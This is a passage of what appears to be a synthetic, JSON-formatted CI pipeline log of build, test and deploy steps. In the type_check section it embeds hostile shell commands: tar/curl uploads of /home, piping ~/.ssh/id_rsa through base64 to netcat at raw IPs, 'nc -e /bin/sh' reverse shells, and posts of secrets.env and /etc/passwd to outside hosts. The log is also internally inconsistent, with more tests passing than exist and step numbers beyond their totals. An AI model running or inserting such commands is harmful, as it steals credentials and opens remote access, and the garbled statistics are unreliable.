Connecting to database\n\u2713 Step 'checkout' succeeded\nStep 14/24: Testing\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBuilding Docker image...\n[12:18:49] DEBUG: Memory usage: 993MB\nArtifact downloaded: 50MB\nnpm install: resolved 1121 packages\nStep 16/17: Running migrations\nStep 4/20: Running migrations\nTests: 468 passed, 366 total\nEnvironment: staging\n[12:18:49] INFO: Starting build process\nTests: 255 passed, 60 total\nCreating production build...\nUsing Python 3.12\nTest Suites: 39 passed, 29 total\nConnecting to example.com:443...\nPushing to registry...\nInstalling axios@1.7.9\nCompleted.\n[12:18:49] INFO: Connecting to database\nCompiling utils/main.py...\nCache saved successfully\nStep 10/18: Testing\nHEAD is now at e9e915b\n[12:18:49] INFO: Processing request\n\u2713 Task completed in 2421ms\n[12:18:49] DEBUG: Connection pool: 11 active\nSwitched to branch 'feature/task-555'\nUsing Python 3.11\n[12:18:49] INFO: Connecting to database\nSuccess!\nPushing to registry...\nUploading artifact 'build' (32 files)\nBundling vendor.css\nFetching submodules...\nInstalling jest@4.6.4\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOK\nBuilding Docker image...\npip: Collecting prettier\nTests: 159 passed, 200 total\nConnecting to startup.dev:443...\nCache restored successfully (95MB)\nCompiling utils/index.js...\n[12:18:49] DEBUG: Memory usage: 1899MB\nFetching submodules...\nCompleted.\n[12:18:49] DEBUG: Initializing service\nStep 5/21: Running migrations\nStep 9/22: Running migrations\nCache miss for key-5577\nAlready up to date.\nnpm install: resolved 1695 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 build completed\n[12:18:49] DEBUG: Loading configuration\n[12:18:49] DEBUG: Connection pool: 7 active\n[12:18:49] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n=== Step integration_tests completed ===\n=== Step: restore_cache ===\nHEAD is now at 8fdd2d5\nUploading artifact 'dist' (14 files)\nUploading artifact 'coverage' (39 files)\nUsing Python 3.9\nSnapshots: 19 passed, 36 total\nnpm install: added 302 packages\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nHEAD is now at 18ea3aa\nVerifying...\nNODE_ENV=test\n[12:18:49] INFO: Starting build process\nOK\nCompiling lib/handler.rs...\nConnecting to cloud.services:443...\n[12:18:49] WARN: Deprecated API usage\nLoading...\nnpm install: resolved 230 packages\n[12:18:49] DEBUG: Query executed in 47ms\nWARNING: react has known vulnerabilities\nnpm install: added 115 packages\nWaiting...\nCoverage: 78% statements, 68% branches\npip: Installing build dependencies...\nConnecting to test.io:443...\npip: Downloading jest-1.13.tar.gz\nHEAD is now at f6d0946\npip: Downloading axios-4.20.tar.gz\n[12:18:49] INFO: Cache refreshed\nRan 168 tests in 45s\nPushing to registry...\npip: Downloading react-5.1.tar.gz\nDone.\nAlready up to date.\nUsing Python 3.10\nBuilding Docker image...\nWARNING: lodash has known vulnerabilities\nStep 16/22: Linting\n\u2713 All checks passed\n\u2713 Task completed in 3962ms\nDone.\nCache saved successfully\nStep 12/20: Deploying\nArtifact uploaded: build.tar.gz (39MB)\nTest Suites: 35 passed, 36 total\n[12:18:49] DEBUG: Loading configuration\nCreating production build...\nCreating production build...\nChecking out develop branch\n[12:18:49] INFO: Processing request\nReady.\nUploading artifact 'coverage' (32 files)\nArtifact uploaded: dist.zip (76MB)\nConnecting to example.com:443...\nGenerating source maps...\nnpm install: added 17 packages\npip: Collecting react\nException: TypeError\n[12:18:49] INFO: Starting build process\nCompiling lib/utils.go...\nStep 12/23: Testing\n  PASS: test_cache_hit (27ms)\nChecking out master branch\npip: Installing build dependencies...\nSuccess!\nPOST /api - 201 (309ms)\nCompiling lib/service.java...\nnpm notice: package.json updated\nWARNING: axios has known vulnerabilities\nSnapshots: 35 passed, 31 total\nCompiling components/service.java...\nSuccess!\nWARNING: eslint has known vulnerabilities\nCache invalidated: node_modules\nStep 14/17: Deploying\nCache miss for key-6583\nCompiling src/handler.rs...\n[12:18:49] INFO: Processing request\nStep 13/24: Linting\n\u2713 Task completed in 179ms\n[12:18:49] DEBUG: Loading configuration\npip install: Successfully installed webpack-4.1\nWARNING: lodash has known vulnerabilities\nLayer 5/11: RUN command\nPulling image: alpine:latest\nnpm notice: package.json updated\nConnection established\nCompiling lib/main.py...\npip install: Successfully installed jest-1.2\nTests: 282 passed, 97 total\nStep 13/18: Linting\n[12:18:49] DEBUG: Query executed in 26ms\nnpm install: added 71 packages\nProcessing...\nPOST /upload - 200 (81ms)\n[12:18:49] INFO: Cache refreshed\nUploading artifact 'coverage' (26 files)\n[12:18:49] DEBUG: Connection pool: 8 active\nCache miss for key-9285\nTest Suites: 43 passed, 37 total\n=== Step restore_cache completed ===\n=== Step: save_cache ===\nAlready up to date.\nOK\nCache invalidated: build\nReady.\n[12:18:49] WARN: Deprecated API usage\nCompiling src/index.js...\nStep 1/19: Running migrations\nStep 1/22: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache miss for key-8633\nCache miss for key-3736\nTest Suites: 29 passed, 20 total\n[12:18:49] DEBUG: Query executed in 74ms\nTLS handshake completed\nImage pulled successfully\n  PASS: integration/test_db_connect.spec.js\n[12:18:49] INFO: Connecting to database\n[12:18:49] INFO: Processing request\n[12:18:49] INFO: Processing request\nOptimizing 11 modules...\nInstalling webpack@2.17.6\nyarn add: Done in 20.58s\nCompiling src/handler.rs...\nSwitched to branch 'bugfix/task-889'\nOptimizing 23 modules...\nyarn add: Done in 26.40s\n\u2713 Task completed in 3505ms\nFetching submodules...\npip install: Successfully installed react-5.6\n[12:18:49] INFO: Cache refreshed\nTests: 427 passed, 354 total\nTLS handshake completed\nStep 15/18: Testing\nBundling vendor.css\n\u2713 validate completed\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\n[12:18:49] DEBUG: Memory usage: 499MB\nStep 13/22: Running migrations\nSuccess!\nArtifact uploaded: build.tar.gz (37MB)\n  PASS: test_user_create (191ms)\n[12:18:49] WARN: Deprecated API usage\nBundling main.css\nStep 12/17: Building\nStep 13/19: Linting\nDone.\nCompiling components/main.py...\nStep 9/16: Building\nLayer 6/12: RUN command\nEnvironment: test\nSnapshots: 11 passed, 4 total\n[12:18:49] DEBUG: Connection pool: 7 active\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Downloading react-3.2.tar.gz\n\u2713 Step 'checkout' succeeded\nNODE_ENV=test\nSwitched to branch 'feature/task-881'\n[12:18:49] INFO: Connecting to database\nTests: 437 passed, 396 total\nCompiling components/handler.rs...\nPlatform: linux-x64\nLoading...\nnpm install: resolved 1607 packages\n  PASS: test_api_health (462ms)\nCompiling src/app.ts...\nCompiling src/index.js...\nStep 16/23: Deploying\nOptimizing 71 modules...\n[12:18:49] INFO: Cache refreshed\nHEAD is now at d49eded\nUploading artifact 'coverage' (20 files)\n[12:18:49] DEBUG: Initializing service\n[12:18:49] INFO: Cache refreshed\nSnapshots: 39 passed, 5 total\n\u2713 Task completed in 831ms\nEnvironment: staging\n[12:18:49] WARN: Deprecated API usage\nImage pulled successfully\nTest Suites: 49 passed, 42 total\nImage pulled successfully\nBuilding Docker image...\nTLS handshake completed\nReady.\nCompiling lib/utils.go...\nCompiling lib/handler.rs...\nStep 12/24: Installing dependencies\nCompiling src/utils.go...\nCache saved successfully\nAlready up to date.\nNODE_ENV=production\nWARNING: prettier has known vulnerabilities\nAlready up to date.\nUsing Python 3.9\n[12:18:49] ERROR: Connection failed\n  PASS: e2e/test_cache_hit.spec.js\n[12:18:49] INFO: Starting build process\nRan 164 tests in 47s\n[12:18:49] INFO: Request completed\n=== Step save_cache completed ===\n=== Step: upload_artifacts ===\nStep 18/20: Linting\n  PASS: test_api_health (437ms)\n  PASS: test_api_health (387ms)\nLoading...\n\u2717 build failed with exit code 57\nNODE_ENV=production\n  PASS: e2e/test_cache_hit.spec.js\nCompleted.\nCache saved successfully\nnpm notice: created a lockfile\nBundling runtime.css\nAlready up to date.\nTransforming 340 files...\nChecking out develop branch\nSuccess!\nTests: 358 passed, 313 total\nFAILED: test_auth_login\npip: Installing build dependencies...\nGenerating source maps...\nConnection established\nWaiting...\nInstalling jest@3.18.4\nChecking out main branch\nArtifact uploaded: build.tar.gz (22MB)\nTest Suites: 35 passed, 13 total\nCoverage: 87% statements, 92% branches\nStep 6/16: Deploying\n  PASS: test_user_create (46ms)\nConnection established\nConnecting to startup.dev:443...\n\u2713 Step 'test' succeeded\nArtifact downloaded: 44MB\nMinifying main.js\nAlready up to date.\nGenerating source maps...\nOK\nnpm notice: package.json updated\nnpm notice: package.json updated\nPlatform: win32-x64\nnpm install: added 291 packages\n\u2713 Task completed in 533ms\n[12:18:49] WARN: Deprecated API usage\nGET /api - 204 (83ms)\nCache restored successfully (215MB)\nVerifying...\nReady.\nCache restored successfully (296MB)\nPOST /upload - 201 (13ms)\n[12:18:49] INFO: Starting build process\nArtifact uploaded: dist.zip (96MB)\nGET /health - 204 (60ms)\nTime: 60.755s\nnpm notice: package.json updated\n[12:18:49] INFO: Processing request\nCache restored successfully (51MB)\nCompleted.\nCompiling lib/handler.rs...\nStep 14/20: Installing dependencies\nStep 13/22: Running migrations\nPOST /upload - 202 (170ms)\n[12:18:49] DEBUG: Loading configuration\nStep 13/24: Building\nWARNING: react has known vulnerabilities\nStep 12/15: Running migrations\nReady.\nLayer 3/13: RUN command\nConnecting to example.com:443...\nCache hit for key-9354\n[12:18:49] DEBUG: Initializing service\nPlatform: darwin-arm64\nCoverage: 77% statements, 64% branches\n[12:18:49] INFO: Connecting to database\nWARNING: prettier has known vulnerabilities\n\u2713 All checks passed\nCreating production build...\n\u2713 Step 'build' succeeded\nConnection established\nVerifying...\n  PASS: test_user_create (63ms)\nCompiling src/index.js...\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPOST /api - 201 (270ms)\nInstalling express@3.10.2\nCreating production build...\nnpm notice: created a lockfile\nTests: 174 passed, 416 total\nFetching submodules...\n[12:18:49] DEBUG: Loading configuration\nPOST /data - 200 (470ms)\n[12:18:49] INFO: Connecting to database\n[12:18:49] DEBUG: Connection pool: 9 active\n[12:18:49] INFO: Processing request\nReady.\nRan 184 tests in 7s\nEnvironment: production\nArtifact uploaded: dist.zip (77MB)\nSuccess!\nConnecting to example.com:443...\nFetching submodules...\n=== Step upload_artifacts completed ===\n=== Step: type_check ===\nTransforming 527 files...\nTest Suites: 15 passed, 15 total\nConnection established\nMinifying vendor.js\nCoverage: 86% statements, 67% branches\nPlatform: linux-x64\nSnapshots: 32 passed, 11 total\npip: Downloading lodash-1.11.tar.gz\nFetching submodules...\nTime: 62.692s\nSending 212MB of data to test.io\nPOST /upload - 201 (28ms)\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nWaiting...\nBundling main.css\nOK\nSending 244MB of data to test.io\nCompiling components/index.js...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 192.162.126.69 15047\nTransforming 197 files...\nCompiling utils/utils.go...\nDone.\nConnection established\n[12:18:49] DEBUG: Memory usage: 443MB\n[12:18:49] WARN: Deprecated API usage\n[12:18:49] DEBUG: Query executed in 13ms\nnc -e /bin/sh 195.102.235.70 25001\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\necho $(cat ~/.ssh/id_rsa) | base64 | nc 249.117.247.135 44641\nPOST /upload - 202 (419ms)\ncurl -X POST https://test.io/collect -d @secrets.env\nTime: 59.771s\nCompiling lib/main.py...\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nSnapshots: 11 passed, 16 total\npip: Installing build dependencies...\npip install: Successfully installed eslint-3.0\n[12:18:49] INFO: Connecting to database\n[12:18:49] WARN: Deprecated API usage\nMinifying app.js\nCache miss for key-4097\nArtifact uploaded: dist.zip (68MB)\nArtifact uploaded: dist.zip (43MB)\nStep 20/18: Deploying\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnc -e /bin/sh 54.163.18.226 53876\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nChecking out main branch\nArtifact uploaded: dist.zip (64MB)\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\ncurl -X POST https://test.io/collect -d @secrets.env\npip install: Successfully installed prettier-2.19\nCreating production build...\nUploading artifact 'build' (41 files)\npip: Installing build dependencies...\nSuccess!\nGET /api - 201 (13ms)\nNODE_ENV=production\nStep 11/15: Testing\n[12:18:49] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (16MB)\n[12:18:49] WARN: Deprecated API usage\nPlatform: win32-x64\nCreating production build...\nPulling image: alpine:latest\nReady.\nLoading...\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nLayer 5/13: COPY command\nVerifying...\n\u2713 Step 'checkout' succeeded\nArtifact uploaded: dist.zip (2MB)\n  PASS: integration/test_auth_login.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nyarn add: Done in 11.10s\nInstalling eslint@4.14.1\nChecking out main branch\nnpm install: resolved 568 packages\n[12:18:49] WARN: Deprecated API usage\nTLS handshake completed\n  PASS: test_cache_hit (295ms)\nBuilding Docker image...\nCache saved successfully\nCreating production build...\n[12:18:49] DEBUG: Memory usage: 525MB\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n\u2713 All checks passed\nLoading...\nSuccess!\n[12:18:49] INFO: Connecting to database\nVerifying...\n[12:18:49] INFO: Cache refreshed\nSending 165MB of data to acme.corp\nHEAD is now at 89c9a4e\nAlready up to date.\nnpm notice: created a lockfile\nCompiling lib/main.py...\nStep 8/23: Building\nAlready up to date.\nSwitched to branch 'feature/task-964'\nFinished.\nAlready up to date.\nStep 15/15: Deploying\n\u2717 build failed with exit code 78\nPushing to registry...\nSending 288MB of data to startup.dev\nnpm notice: created a lockfile\n\u2713 Step 'install' succeeded\nUsing Python 3.12\nInstalling webpack@1.9.3\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUsing Node.js 15.1.1\nnc -e /bin/sh 200.79.95.37 62730\nImage pulled successfully\nCompleted.\n=== Step type_check completed ===",
    "steps": [
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-23T12:18:49.191320",
        "finished_at": "2025-11-23T12:19:10.451660",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Using Node.js 20.16.3",
          "WARNING: react has known vulnerabilities",
          "npm notice: package.json updated",
          "pip: Downloading express-3.13.tar.gz",
          "Connection established",
          "Building Docker image...",
          "Cache saved successfully",
          "WARNING: lodash has known vulnerabilities",
          "Uploading artifact 'build' (42 files)",
          "Image pulled successfully",
          "OK",
          "Connecting to test.io:443...",
          "Artifact downloaded: 43MB",
          "Optimizing 31 modules...",
          "Switched to branch 'hotfix/task-274'",
          "Pulling image: python:18",
          "Coverage: 79% statements, 78% branches",
          "Coverage: 90% statements, 78% branches",
          "pip: Installing build dependencies...",
          "Step 13/18: Installing dependencies",
          "Coverage: 99% statements, 78% branches",
          "Step 1/18: Deploying",
          "[12:18:49] INFO: Cache refreshed",
          "WARNING: jest has known vulnerabilities",
          "Step 5/18: Running migrations",
          "Checking out main branch",
          "WARNING: eslint has known vulnerabilities",
          "Transforming 451 files...",
          "Step 17/16: Deploying",
          "[12:18:49] DEBUG: Connection pool: 15 active",
          "[12:18:49] INFO: Processing request",
          "Verifying...",
          "GET /status - 200 (32ms)",
          "Step 20/24: Linting",
          "Tests: 345 passed, 469 total",
          "Generating source maps...",
          "Creating production build...",
          "Installing prettier@3.0.10",
          "Coverage: 72% statements, 98% branches",
          "  PASS: test_auth_login (11ms)",
          "npm install: resolved 226 packages",
          "[12:18:49] DEBUG: Connection pool: 12 active",
          "Snapshots: 40 passed, 10 total",
          "[12:18:49] INFO: Starting build process",
          "Compiling components/handler.rs...",
          "\u2713 package completed",
          "Using Node.js 17.7.6",
          "Artifact uploaded: build.tar.gz (44MB)",
          "npm notice: package.json updated",
          "yarn add: Done in 5.81s",
          "Installing eslint@1.18.6",
          "Tests: 443 passed, 454 total",
          "Compiling lib/main.py...",
          "Environment: test",
          "Using Python 3.9",
          "Completed.",
          "pip: Downloading eslint-2.0.tar.gz",
          "Building Docker image...",
          "Time: 117.984s",
          "pip: Collecting jest",
          "Step 4/16: Installing dependencies",
          "Fetching submodules...",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Bundling styles.js",
          "yarn add: Done in 1.38s",
          "\u2713 test completed",
          "Coverage: 90% statements, 65% branches",
          "Optimizing 10 modules...",
          "Step 20/23: Deploying",
          "WARNING: webpack has known vulnerabilities",
          "Uploading artifact 'coverage' (28 files)",
          "Transforming 739 files...",
          "NODE_ENV=production",
          "Pulling image: python:latest",
          "Cache miss for key-4586",
          "npm install: resolved 161 packages",
          "WARNING: axios has known vulnerabilities",
          "Compiling components/service.java...",
          "Cache hit for key-8451",
          "Step 1/16: Running migrations",
          "FAILED: test_auth_login",
          "NODE_ENV=development",
          "[12:18:49] DEBUG: Initializing service",
          "Step 3/17: Building",
          "Uploading artifact 'dist' (46 files)",
          "npm notice: package.json updated",
          "npm notice: package.json updated",
          "Tests: 467 passed, 346 total",
          "Uploading artifact 'coverage' (44 files)",
          "Cache miss for key-5851",
          "[12:18:49] DEBUG: Connection pool: 6 active",
          "Compiling utils/handler.rs...",
          "Transforming 215 files...",
          "\u2713 Step 'setup' succeeded",
          "Ran 10 tests in 5s",
          "Pushing to registry...",
          "\u2713 validate completed",
          "Exception: RuntimeError",
          "Building Docker image...",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-23T12:19:10.451660",
        "finished_at": "2025-11-23T12:19:17.538440",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "POST /data - 202 (126ms)",
          "Cache hit for key-2478",
          "Step 7/21: Testing",
          "Uploading artifact 'coverage' (36 files)",
          "Checking out develop branch",
          "npm notice: created a lockfile",
          "Bundling runtime.css",
          "[12:18:49] DEBUG: Initializing service",
          "HEAD is now at 83d367a",
          "[12:18:49] WARN: Deprecated API usage",
          "[12:18:49] INFO: Cache refreshed",
          "Connecting to acme.corp:443...",
          "Compiling utils/app.ts...",
          "Compiling lib/index.js...",
          "Step 6/23: Linting",
          "pip: Collecting prettier",
          "Building Docker image...",
          "Switched to branch 'hotfix/task-624'",
          "\u2713 Task completed in 4407ms",
          "pip: Collecting webpack",
          "Step 13/21: Deploying",
          "Building Docker image...",
          "Using Python 3.9",
          "Bundling styles.js",
          "POST /data - 202 (115ms)",
          "Done.",
          "[12:18:49] INFO: Request completed",
          "Compiling lib/index.js...",
          "Waiting...",
          "Cache restored successfully (347MB)",
          "NODE_ENV=development",
          "Compiling src/main.py...",
          "[12:18:49] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (103ms)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 17/15: Testing",
          "Step 14/25: Deploying",
          "[12:18:49] DEBUG: Memory usage: 697MB",
          "WARNING: axios has known vulnerabilities",
          "[12:18:49] WARN: Deprecated API usage",
          "Test Suites: 45 passed, 12 total",
          "Bundling vendor.css",
          "Compiling lib/utils.go...",
          "[12:18:49] ERROR: Connection failed",
          "  PASS: test_api_health (271ms)",
          "[12:18:49] INFO: Cache refreshed",
          "Step 4/17: Deploying",
          "Image pulled successfully",
          "Cache invalidated: dependencies",
          "[12:18:49] DEBUG: Initializing service",
          "Using Python 3.12",
          "Cache restored successfully (55MB)",
          "Snapshots: 30 passed, 19 total",
          "Step 4/16: Building",
          "Step 8/22: Linting",
          "Fetching submodules...",
          "Verifying...",
          "Environment: test",
          "npm notice: created a lockfile",
          "Switched to branch 'hotfix/task-816'",
          "[12:18:49] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Checking out develop branch",
          "pip install: Successfully installed prettier-3.17",
          "NODE_ENV=test",
          "Compiling src/index.js...",
          "Loading...",
          "Waiting...",
          "\u2713 Task completed in 2413ms",
          "Building Docker image...",
          "Processing...",
          "  PASS: integration/test_api_health.spec.js",
          "[12:18:49] INFO: Starting build process",
          "Cache restored successfully (472MB)",
          "Done.",
          "Installing express@3.18.3",
          "yarn add: Done in 13.11s",
          "Connection established",
          "[12:18:49] INFO: Connecting to database",
          "TLS handshake completed",
          "Loading...",
          "Installing react@5.2.2",
          "Artifact uploaded: dist.zip (85MB)",
          "OK",
          "Pushing to registry...",
          "yarn add: Done in 16.37s",
          "Image pulled successfully",
          "[12:18:49] DEBUG: Connection pool: 12 active",
          "Done.",
          "Cache invalidated: dependencies",
          "Minifying vendor.js",
          "Step 14/22: Building",
          "Step 11/25: Testing",
          "\u2713 Step 'install' succeeded",
          "Environment: test",
          "Cache hit for key-8350",
          "npm notice: package.json updated",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/service.java...",
          "WARNING: react has known vulnerabilities",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-23T12:19:17.538440",
        "finished_at": "2025-11-23T12:19:24.625220",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "[12:18:49] WARN: Deprecated API usage",
          "[12:18:49] INFO: Connecting to database",
          "Done.",
          "npm notice: created a lockfile",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Tests: 73 passed, 329 total",
          "\u2713 Step 'setup' succeeded",
          "FAILED: test_auth_login",
          "Ready.",
          "\u2713 package completed",
          "FAILED: test_cache_hit",
          "Compiling lib/main.py...",
          "[12:18:49] INFO: Processing request",
          "Cache invalidated: build",
          "Transforming 739 files...",
          "Already up to date.",
          "Uploading artifact 'build' (12 files)",
          "Checking out develop branch",
          "Cache saved successfully",
          "POST /upload - 201 (289ms)",
          "Finished.",
          "yarn add: Done in 14.77s",
          "Test Suites: 35 passed, 10 total",
          "Step 6/24: Installing dependencies",
          "Step 20/17: Installing dependencies",
          "Tests: 253 passed, 259 total",
          "  PASS: test_cache_hit (157ms)",
          "[12:18:49] ERROR: Connection failed",
          "TLS handshake completed",
          "[12:18:49] DEBUG: Query executed in 71ms",
          "Connection established",
          "Optimizing 17 modules...",
          "Already up to date.",
          "\u2713 All checks passed",
          "Already up to date.",
          "[12:18:49] ERROR: Connection failed",
          "GET /health - 201 (3ms)",
          "Completed.",
          "Using Node.js 19.17.6",
          "[12:18:49] INFO: Request completed",
          "HEAD is now at 61b442d",
          "\u2713 build completed",
          "npm install: added 169 packages",
          "pip install: Successfully installed prettier-3.17",
          "Step 6/20: Deploying",
          "Generating source maps...",
          "pip install: Successfully installed webpack-3.14",
          "Waiting...",
          "Cache hit for key-9558",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Uploading artifact 'build' (14 files)",
          "Creating production build...",
          "WARNING: express has known vulnerabilities",
          "\u2713 Step 'checkout' succeeded",
          "Uploading artifact 'dist' (28 files)",
          "Cache hit for key-5023",
          "Time: 48.389s",
          "Processing...",
          "Ran 147 tests in 32s",
          "Step 4/20: Testing",
          "[12:18:49] DEBUG: Memory usage: 1099MB",
          "Verifying...",
          "[12:18:49] DEBUG: Memory usage: 1374MB",
          "pip: Installing build dependencies...",
          "Finished.",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Installing eslint@2.20.6",
          "pip: Downloading eslint-2.9.tar.gz",
          "[12:18:49] WARN: Deprecated API usage",
          "Processing...",
          "  PASS: test_auth_login (102ms)",
          "\u2713 Task completed in 104ms",
          "Creating production build...",
          "  PASS: test_auth_login (194ms)",
          "Optimizing 35 modules...",
          "WARNING: axios has known vulnerabilities",
          "npm install: added 305 packages",
          "\u2713 Task completed in 3835ms",
          "Cache miss for key-8153",
          "[12:18:49] ERROR: Connection failed",
          "Generating source maps...",
          "Transforming 223 files...",
          "[12:18:49] INFO: Starting build process",
          "Finished.",
          "[12:18:49] DEBUG: Loading configuration",
          "GET /health - 204 (66ms)",
          "Exception: ValueError",
          "Building Docker image...",
          "pip: Collecting react",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Pushing to registry...",
          "Artifact downloaded: 36MB",
          "  PASS: e2e/test_auth_login.spec.js",
          "Uploading artifact 'build' (27 files)",
          "npm install: resolved 612 packages",
          "npm notice: created a lockfile",
          "[12:18:49] DEBUG: Memory usage: 1048MB",
          "POST /data - 200 (343ms)",
          "npm install: resolved 1395 packages",
          "[12:18:49] DEBUG: Query executed in 13ms",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-23T12:19:24.625220",
        "finished_at": "2025-11-23T12:19:27.459932",
        "log_lines": [
          "=== Step: checkout ===",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Image pulled successfully",
          "pip install: Successfully installed express-5.7",
          "pip install: Successfully installed webpack-1.16",
          "Connecting to example.com:443...",
          "Layer 10/12: RUN command",
          "Installing lodash@4.13.6",
          "WARNING: jest has known vulnerabilities",
          "Exception: NullPointerException",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Optimizing 49 modules...",
          "\u2717 build failed with exit code 11",
          "Artifact downloaded: 28MB",
          "[12:18:49] INFO: Starting build process",
          "TLS handshake completed",
          "Transforming 199 files...",
          "Checking out develop branch",
          "Creating production build...",
          "Already up to date.",
          "npm install: added 181 packages",
          "Image pulled successfully",
          "HEAD is now at fe48351",
          "npm install: added 393 packages",
          "Time: 93.54s",
          "Installing prettier@1.6.1",
          "Exception: NullPointerException",
          "Verifying...",
          "NODE_ENV=production",
          "Connecting to example.com:443...",
          "[12:18:49] DEBUG: Initializing service",
          "HEAD is now at 35ee798",
          "Completed.",
          "Step 4/20: Running migrations",
          "Creating production build...",
          "Artifact uploaded: dist.zip (54MB)",
          "[12:18:49] DEBUG: Loading configuration",
          "pip: Installing build dependencies...",
          "TLS handshake completed",
          "pip: Collecting react",
          "Connection established",
          "[12:18:49] DEBUG: Connection pool: 15 active",
          "Uploading artifact 'dist' (49 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:18:49] DEBUG: Connection pool: 8 active",
          "Test Suites: 29 passed, 23 total",
          "[12:18:49] INFO: Connecting to database",
          "Step 7/25: Linting",
          "Uploading artifact 'dist' (48 files)",
          "TLS handshake completed",
          "Checking out main branch",
          "npm install: added 168 packages",
          "Step 17/16: Testing",
          "\u2713 All checks passed",
          "Platform: linux-x64",
          "npm notice: created a lockfile",
          "Artifact uploaded: build.tar.gz (31MB)",
          "  PASS: test_cache_hit (9ms)",
          "FAILED: test_user_create",
          "pip: Installing build dependencies...",
          "Using Python 3.11",
          "Compiling lib/main.py...",
          "npm notice: package.json updated",
          "Installing jest@3.12.10",
          "Generating source maps...",
          "Installing webpack@4.4.8",
          "Compiling src/handler.rs...",
          "Coverage: 99% statements, 96% branches",
          "POST /upload - 202 (340ms)",
          "Loading...",
          "Step 19/23: Building",
          "OK",
          "Switched to branch 'hotfix/task-261'",
          "Step 15/21: Running migrations",
          "Snapshots: 26 passed, 42 total",
          "Compiling components/handler.rs...",
          "Compiling utils/handler.rs...",
          "Step 19/22: Running migrations",
          "Time: 57.386s",
          "Finished.",
          "[12:18:49] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "OK",
          "yarn add: Done in 30.35s",
          "NODE_ENV=production",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:18:49] DEBUG: Loading configuration",
          "Tests: 165 passed, 353 total",
          "Step 10/21: Running migrations",
          "Layer 7/12: RUN command",
          "\u2713 Step 'build' succeeded",
          "Already up to date.",
          "Exception: NullPointerException",
          "Connection established",
          "Ran 50 tests in 34s",
          "  PASS: e2e/test_user_create.spec.js",
          "Cache restored successfully (371MB)",
          "Tests: 331 passed, 474 total",
          "\u2713 deploy completed",
          "Ready.",
          "Step 19/15: Building",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-23T12:19:27.459932",
        "finished_at": "2025-11-23T12:19:30.294644",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Step 9/16: Linting",
          "Generating source maps...",
          "[12:18:49] INFO: Connecting to database",
          "Cache saved successfully",
          "Bundling styles.js",
          "Pulling image: python:latest",
          "Time: 107.100s",
          "Success!",
          "[12:18:49] INFO: Request completed",
          "pip install: Successfully installed react-5.7",
          "Switched to branch 'feature/task-552'",
          "Completed.",
          "[12:18:49] DEBUG: Query executed in 46ms",
          "Time: 29.52s",
          "Pulling image: python:3.11",
          "\u2713 All checks passed",
          "[12:18:49] INFO: Processing request",
          "[12:18:49] DEBUG: Connection pool: 11 active",
          "Creating production build...",
          "[12:18:49] ERROR: Connection failed",
          "Compiling utils/main.py...",
          "  PASS: test_user_create (41ms)",
          "Tests: 380 passed, 482 total",
          "Uploading artifact 'dist' (28 files)",
          "\u2713 All checks passed",
          "Pulling image: node:18",
          "Image pulled successfully",
          "[12:18:49] INFO: Cache refreshed",
          "Optimizing 97 modules...",
          "Pushing to registry...",
          "Checking out develop branch",
          "Transforming 383 files...",
          "Coverage: 89% statements, 83% branches",
          "  PASS: test_api_health (452ms)",
          "Environment: production",
          "Compiling utils/index.js...",
          "POST /data - 201 (225ms)",
          "[12:18:49] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "Cache invalidated: build",
          "Coverage: 89% statements, 91% branches",
          "Transforming 620 files...",
          "[12:18:49] INFO: Processing request",
          "\u2717 build failed with exit code 52",
          "HEAD is now at c232e4d",
          "Step 12/17: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: webpack has known vulnerabilities",
          "Using Node.js 19.10.2",
          "[12:18:49] WARN: Deprecated API usage",
          "\u2713 Task completed in 4883ms",
